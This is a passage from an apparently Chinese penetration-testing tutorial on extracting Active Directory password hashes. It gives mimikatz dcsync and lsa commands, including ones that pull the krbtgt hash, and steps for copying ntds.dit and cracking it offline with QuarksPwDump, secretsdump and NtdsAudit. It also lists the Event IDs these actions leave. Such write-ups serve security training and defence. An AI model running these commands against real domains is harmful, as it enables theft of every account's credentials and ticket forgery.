文件下载下来，直接在已有的shell上破解。</p><p>有一个cs弹回的beacon，就可以在beacon中直接利用mimikatz来破解，这一切的前提是有管理员权限</p><p>Mimikatz有一个功能（dcsync），它可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。<br>使用Mimikatz的 dcsync 功能，可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。<br>在获得管理员权限后，通过Cobaltstrike弹回的beacon利用mimikatz模块进行密码Hash提取。</p><ul><li>获取mingy域内所有用户Hash</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:mingy.com /all /csv</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040733478.png" alt="image-20220804073326225"></p><ul><li>查看单个用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081301322.png" alt="image-20220804073401680"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040734173.png" alt="image-20220804073413925"></p><ul><li>查看所有用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /inject</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040734808.png" alt="image-20220804073445574"></p><h3 id="7-2-离线破解"><a href="#7-2-离线破解" class="headerlink" title="7.2 离线破解"></a>7.2 离线破解</h3><p>离线破解一般需要两步，首先就是将远端域控的 ntds.dit 下载到本地，然后再在本地进行破解。<br>ntds.dit 文件一直在被 windows 系统使用，所以常规的复制下载方法是无法将文件下载到本地的。<br>首先将域控的 NTDS.DIT  和 SYSTEM  文件下载到本地，然后在本地进行破解。</p><ul><li>QuarksPwDump</li></ul><p>QuarksPwDump 是一款用于Windows用户凭据提取的开源工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p><ol><li>修复复制出来的数据库</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040746917.png" alt="image-20220804074604700"></p><ol start="2"><li>使用QuarksPwDump直接读取信息并将结果导出至文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QuarksPwDump.exe --dump-hash-domain --output mingy.com.txt --ntds-file ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040746546.png" alt="image-20220804074653343"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040747935.png" alt="image-20220804074702750"></p><ul><li>SecretsDump</li></ul><p>通过impacket套件中的secretsdump.py脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.exe -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br><span class="line">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040747348.png" alt="image-20220804074755079"></p><ul><li>NtdsAudit</li></ul><blockquote><p><a href="https://github.com/Dionach/NtdsAudit">https://github.com/Dionach/NtdsAudit</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;system.hive&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040748184.png" alt="image-20220804074833890"></p><h2 id="8-扩展"><a href="#8-扩展" class="headerlink" title="8 扩展"></a>8 扩展</h2><ol><li>日志文件</li></ol><p>调用 Volume Shadow Copy 服务会产生日志文件，位于System下， Event ID 为 7036<br>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为98的日志文件<br>如下图</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040749987.png" alt="image-20220804074903788"></p><ol start="2"><li>访问快照中的文件</li></ol><p>查看快照列表：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><p>无法直接访问 ?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12  中的文件,可通过创建符号链接访问快照中的文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></pre></td></tr></table></figure><p>删除符号链接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rd c:\testvsc</span><br></pre></td></tr></table></figure><p>如下图</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040750029.png" alt="image-20220804075023798"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Windows认证机制 </tag>
            
            <tag> Windows凭证 </tag>
            
            <tag> 域凭证 </tag>
            
            <tag> NTLM </tag>
            
            <tag> 票据伪造 </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
